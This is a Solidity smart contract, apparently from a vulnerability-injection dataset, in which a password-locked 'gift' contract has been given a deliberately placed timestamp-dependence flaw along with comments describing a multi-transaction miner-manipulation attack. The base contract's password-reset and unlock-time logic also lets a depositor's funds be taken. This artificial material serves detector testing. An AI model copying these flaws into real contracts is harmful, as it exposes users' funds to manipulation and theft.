/*
 * ===== SmartInject Injection Details =====
 * Function      : ExtendUnlockTime
 * Vulnerability : Timestamp Dependence
 * Status        : Not Detected
 * Type          : Fallback Function Addition
 *
 * === Verification Results ===
 * Detected      : False
 * Relevant      : 0 findings
 * Total Found   : 2 issues
 * Retry Count   : 0
 *
 * === Description ===
 * This vulnerability introduces a timestamp dependence issue that is stateful and requires multiple transactions to exploit. The vulnerability allows the contract sender to manipulate the unlock time through timestamp manipulation across multiple blocks. The attack requires: 1) Multiple calls to ExtendUnlockTime with miner timestamp manipulation, 2) Strategic use of ResetExtensions to bypass extension limits, 3) Accumulated state changes in extensionCount and lastExtensionTime that persist between transactions. This creates a multi-transaction attack vector where malicious miners can help the sender indefinitely delay the unlock time by manipulating block timestamps.
 */
pragma solidity ^0.4.19;

contract GIFT_1_ETH
{
    bytes32 public hashPass;
    
    bool closed = false;
    
    address sender;
 
    uint unlockTime;
 
    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00 )
        {
            hashPass = hash;
            sender = msg.sender;
            unlockTime = now;
        }
    }
    
    function SetGiftTime(uint date)
    public
    {
        if(msg.sender==sender)
        {
            unlockTime = date;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    canOpen
    {
        if(hashPass == keccak256(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function Revoce()
    public
    payable
    canOpen
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass&&msg.sender==sender)
        {
           closed=true;
        }
    }
    
    modifier canOpen
    {
        require(now>unlockTime);
        _;
    }
    
    function() public payable{}
    

    // === FALLBACK INJECTION: Timestamp Dependence ===
    // This function was added as a fallback when existing functions failed injection
    uint public lastExtensionTime;
    uint public extensionCount;
    
    function ExtendUnlockTime(uint additionalTime)
    public
    {
        if(msg.sender == sender && !closed)
        {
            // Vulnerable: Using block timestamp for time-sensitive operations
            // This creates a multi-transaction vulnerability where:
            // 1. First call sets lastExtensionTime
            // 2. Subsequent calls within same block can bypass the time check
            // 3. Miners can manipulate timestamp to enable multiple extensions
            
            if(lastExtensionTime == 0 || now > lastExtensionTime + 1 minutes)
            {
                unlockTime += additionalTime;
                lastExtensionTime = now;
                extensionCount++;
            }
        }
    }
    
    function ResetExtensions()
    public
    {
        if(msg.sender == sender && extensionCount > 0)
        {
            // Vulnerable: Timestamp dependence allows manipulation
            // Attack scenario requires multiple transactions:
            // 1. Call ExtendUnlockTime multiple times in manipulated blocks
            // 2. Call ResetExtensions to reset counter
            // 3. Repeat to indefinitely delay unlock time
            
            if(now > lastExtensionTime + 5 minutes)
            {
                extensionCount = 0;
                lastExtensionTime = 0;
            }
        }
    }
    // === END FALLBACK INJECTION ===

}